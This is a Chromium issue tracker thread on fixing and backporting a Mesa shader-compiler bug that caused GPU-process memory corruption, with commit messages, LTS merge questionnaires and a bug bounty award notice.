### pe...@google.com (2025-06-02)

Thank you for providing more feedback. Adding the requester to the CC list.

### ch...@google.com (2025-06-03)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2025-06-03)

Setting Priority to P1 to match Severity s1. If this is incorrect, please reset the priority. The automation bot account won't make this change again.

### pe...@google.com (2025-06-03)

The NextAction date has arrived: 2025-06-03
To opt-out from this automation rule, please add Optout-Blintz-Nextaction-Alert to the "Chromium Labels" custom field.

### ms...@google.com (2025-06-03)

Upstream MR with a fix is here: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/35312>

### a7...@gmail.com (2025-06-03)

Urgh, I'm currently traveling hence don't have access to my desktop machine (with a Intel BMG G21 that does support subgroups); my laptop's GPU doesn't support subgroups. As such I won't be able to test M136 for the next couple of days.

### ms...@google.com (2025-06-03)

No problem. I don't expect to need to do much except confirm the fix locally and cherry pick it to ChromeOS.

Thanks for the report!

### ms...@google.com (2025-06-10)

CLs created:

- [crrev/c/6633550](https://crrev.com/c/6633550)
- [crrev/c/6633551](https://crrev.com/c/6633551)

### dx...@google.com (2025-06-10)

Project: chromiumos/third\_party/mesa  

Branch: chromeos-iris  

Author: Georg Lehmann [dadschoorse@gmail.com](mailto:dadschoorse@gmail.com)  

Link:      <https://chromium-review.googlesource.com/6633550>

UPSTREAM: nir/opt\_if: don't replace constant uses with other uniform values

---


Expand for full commit details
```
     
    If constant folding wasn't run, this could replace constant uses with different 
    constants. 
     
    Additional, it could also create worse code for "if (subgroupXor(1) == 1)". 
     
    Closes: https://gitlab.freedesktop.org/mesa/mesa/-/issues/13281 
     
    Cc: mesa-stable 
     
    Acked-by: Lionel Landwerlin <lionel.g.landwerlin@intel.com> 
    Reviewed-by: Rhys Perry <pendingchaos02@gmail.com> 
    Part-of: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/35312> 
    (cherry picked from commit eaeaf9554d70783c5cd0a4d5d47c6a1552f783f0 
     https://gitlab.freedesktop.org/mesa/mesa.git main) 
     
    BUG=b:421399969 
    TEST=Run crafted WebGPU shader without crashing 
     
    Change-Id: I95c87bf8ce22d21f9819f09071644b7c287afbcf 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6633550 
    Reviewed-by: Sean Paul <sean@poorly.run> 
    Reviewed-by: Juston Li <justonli@google.com> 
    Commit-Queue: Matt Turner <msturner@google.com> 
    Tested-by: Matt Turner <msturner@google.com> 
    Auto-Submit: Matt Turner <msturner@google.com> 
    Commit-Queue: Juston Li <justonli@google.com>

```

---

Files:

- M `src/compiler/nir/nir_opt_if.c`

---

Hash: 3803371dc47cea75b805a3fded0662ae05742320  

Date:  Mon Jun 2 21:10:45 2025


---

### dx...@google.com (2025-06-10)

Project: chromiumos/third\_party/mesa  

Branch: chromeos-iris  

Author: Georg Lehmann [dadschoorse@gmail.com](mailto:dadschoorse@gmail.com)  

Link:      <https://chromium-review.googlesource.com/6633551>

BACKPORT: UPSTREAM: nir/opt\_if: limit rewrite\_uniform\_uses iand recursion

---


Expand for full commit details
```
     
    https://github.com/doitsujin/dxvk/issues/4970 has a shader 
    where unrolled loops caused large iand chains and if we don't 
    limit this  we won't finish compiling in reasonable time. 
     
    Cc: mesa-stable 
     
    Acked-by: Lionel Landwerlin <lionel.g.landwerlin@intel.com> 
    Reviewed-by: Rhys Perry <pendingchaos02@gmail.com> 
    Part-of: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/35312> 
     
    (cherry picked from commit 1c4070f3e95dcc749acbcd39e7c7c91e426b640e 
     https://gitlab.freedesktop.org/mesa/mesa.git main) 
     
    Conflicts: 
       src/compiler/nir/nir_opt_if.c 
     
    BUG=b:421399969 
    TEST=Run crafted WebGPU shader without crashing 
     
    Change-Id: I97b15ac9a14ebc64fd66f41bf72bcdd750ef9a89 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6633551 
    Auto-Submit: Matt Turner <msturner@google.com> 
    Reviewed-by: Juston Li <justonli@google.com> 
    Tested-by: Matt Turner <msturner@google.com> 
    Commit-Queue: Juston Li <justonli@google.com>

```

---

Files:

- M `src/compiler/nir/nir_opt_if.c`

---

Hash: 550b26838367f39a4d2a40aada52d74bb8967f35  

Date:  Tue Jun 3 12:09:54 2025


---

### pe...@google.com (2025-06-10)

LTS Milestone M132

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### ch...@google.com (2025-06-10)

Dear owner, thanks for fixing this bug. We've reopened it because:

- It is not clear which CLs have ‘fixed’ (=required to consider the bug resolved; e.g. not logging) this bug. Please fill in the “Fixed By Code Changes” field with the appropriate Gerrit url to disambiguate using the following guidelines:
  - If there are multiple CLs required, please list all.
  - If the fix landed in a third party library (v8, Dawn, etc), please list the third party commits - not the rolls.
  - If there are cherrypicks or back merges, please list the original commits which landed on HEAD.
  - If there is no relevant Gerrit link (i.e. the fix does not live in or roll into Chromium), please use the value ‘NA’.
  - If this is a non-browser ChromeOS-specific bug, please move it to component 1335705 in the Google issue tracker.
  - If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.
    After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ms...@google.com (2025-06-16)

> Was this issue a regression for the milestone it was found in?

No, it existed in previous milestones.

> Is this issue related to a change or feature merged after the latest LTS Milestone?

No.

### ch...@google.com (2025-06-16)

Dear owner, thanks for fixing this bug. We've reopened it because:

- Some CLs listed in the “Fixed By Code Changes” field are invalid and have been removed. Please provide an appropriate Gerrit url that matches the pattern: `https://<host>-review.googlesource.com/c/<repo>/+/<change_number>` or use the value 'NA' and re-mark this bug as fixed. If this field requires human intervention for some reason, please add this bug to the hotlist id 6265590.After resolving the above issue(s), this bug can be marked closed again. Thanks for your time!

### ms...@google.com (2025-06-16)

Trying this again.

### pe...@google.com (2025-06-19)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2025-06-19)

1. https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6654242 and https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6654243
2. Low - There was no conflict.
3. No
4. Yes. According to comment #17, the issue has existed in previous milestones.

### sp...@google.com (2025-06-25)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $10000.00 for this report.

Rationale for this decision:
report of memory corruption in a highly privileged process (GPU) 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2025-06-26)

Congratulations! Thank you for your efforts and reporting this issue to us! 

### pe...@google.com (2025-09-18)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### ch...@google.com (2025-09-23)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

### rz...@google.com (2025-09-25)

Answering the questionnaire for LTS 138:

1. <https://crrev.com/c/6954347> and <https://crrev.com/c/6954103/1>
2. Low, no conflicts
3. 140
4. Yes

### ry...@google.com (2025-10-02)

@an...@google.com: just confirming that we have been granted approval to merge these two for M138 LTS?

- <https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6954103>
- <https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6954347/1>

### dx...@google.com (2025-10-06)

Project: chromiumos/third\_party/mesa  

Branch:  release-R138-16295.B-chromeos-iris  

Author:  Georg Lehmann [dadschoorse@gmail.com](mailto:dadschoorse@gmail.com)  

Link:    <https://chromium-review.googlesource.com/6954103>

[M138-LTS] BACKPORT: UPSTREAM: nir/opt\_if: limit rewrite\_uniform\_uses iand recursion

---


Expand for full commit details
```
     
    https://github.com/doitsujin/dxvk/issues/4970 has a shader 
    where unrolled loops caused large iand chains and if we don't 
    limit this  we won't finish compiling in reasonable time. 
     
    Cc: mesa-stable 
     
    Acked-by: Lionel Landwerlin <lionel.g.landwerlin@intel.com> 
    Reviewed-by: Rhys Perry <pendingchaos02@gmail.com> 
    Part-of: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/35312> 
     
    (cherry picked from commit 1c4070f3e95dcc749acbcd39e7c7c91e426b640e 
     https://gitlab.freedesktop.org/mesa/mesa.git main) 
     
    Conflicts: 
       src/compiler/nir/nir_opt_if.c 
     
    BUG=b:421399969 
    TEST=Run crafted WebGPU shader without crashing 
     
    Change-Id: I97b15ac9a14ebc64fd66f41bf72bcdd750ef9a89 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6633551 
    Auto-Submit: Matt Turner <msturner@google.com> 
    Tested-by: Matt Turner <msturner@google.com> 
    Commit-Queue: Juston Li <justonli@google.com> 
    (cherry picked from commit 550b26838367f39a4d2a40aada52d74bb8967f35) 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6954103 
    Reviewed-by: Chia-I Wu <olv@google.com> 
    Tested-by: Ryan Neph <ryanneph@google.com> 
    Reviewed-by: Ryan Neph <ryanneph@google.com>

```

---

Files:

- M `src/compiler/nir/nir_opt_if.c`

---

Hash: [1966c9b2c5cb6fc7694412d2f70a5534f3d7964d](https://chromiumdash.appspot.com/commit/1966c9b2c5cb6fc7694412d2f70a5534f3d7964d)  

Date: Tue Jun 3 12:09:54 2025


---

### dx...@google.com (2025-10-06)

Project: chromiumos/third\_party/mesa  

Branch:  release-R138-16295.B-chromeos-iris  

Author:  Georg Lehmann [dadschoorse@gmail.com](mailto:dadschoorse@gmail.com)  

Link:    <https://chromium-review.googlesource.com/6954347>

[M138-LTS] UPSTREAM: nir/opt\_if: don't replace constant uses with other uniform values

---


Expand for full commit details
```
     
    If constant folding wasn't run, this could replace constant uses with different 
    constants. 
     
    Additional, it could also create worse code for "if (subgroupXor(1) == 1)". 
     
    Closes: https://gitlab.freedesktop.org/mesa/mesa/-/issues/13281 
     
    Cc: mesa-stable 
     
    Acked-by: Lionel Landwerlin <lionel.g.landwerlin@intel.com> 
    Reviewed-by: Rhys Perry <pendingchaos02@gmail.com> 
    Part-of: <https://gitlab.freedesktop.org/mesa/mesa/-/merge_requests/35312> 
    (cherry picked from commit eaeaf9554d70783c5cd0a4d5d47c6a1552f783f0 
     https://gitlab.freedesktop.org/mesa/mesa.git main) 
     
    BUG=b:421399969 
    TEST=Run crafted WebGPU shader without crashing 
     
    Change-Id: I95c87bf8ce22d21f9819f09071644b7c287afbcf 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6633550 
    Commit-Queue: Matt Turner <msturner@google.com> 
    Tested-by: Matt Turner <msturner@google.com> 
    Auto-Submit: Matt Turner <msturner@google.com> 
    Commit-Queue: Juston Li <justonli@google.com> 
    (cherry picked from commit 3803371dc47cea75b805a3fded0662ae05742320) 
    Reviewed-on: https://chromium-review.googlesource.com/c/chromiumos/third_party/mesa/+/6954347 
    Reviewed-by: Ryan Neph <ryanneph@google.com> 
    Reviewed-by: Chia-I Wu <olv@google.com> 
    Tested-by: Ryan Neph <ryanneph@google.com>

```

---

Files:

- M `src/compiler/nir/nir_opt_if.c`

---

Hash: [a156d3f4bb5d5b0e45df55ae2e5f8b7c1df32cc7](https://chromiumdash.appspot.com/commit/a156d3f4bb5d5b0e45df55ae2e5f8b7c1df32cc7)  

Date: Mon Jun 2 21:10:45 2025


---

## Bounty Award

> report of memory corruption in a highly privileged process (GPU)

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/421399969)*
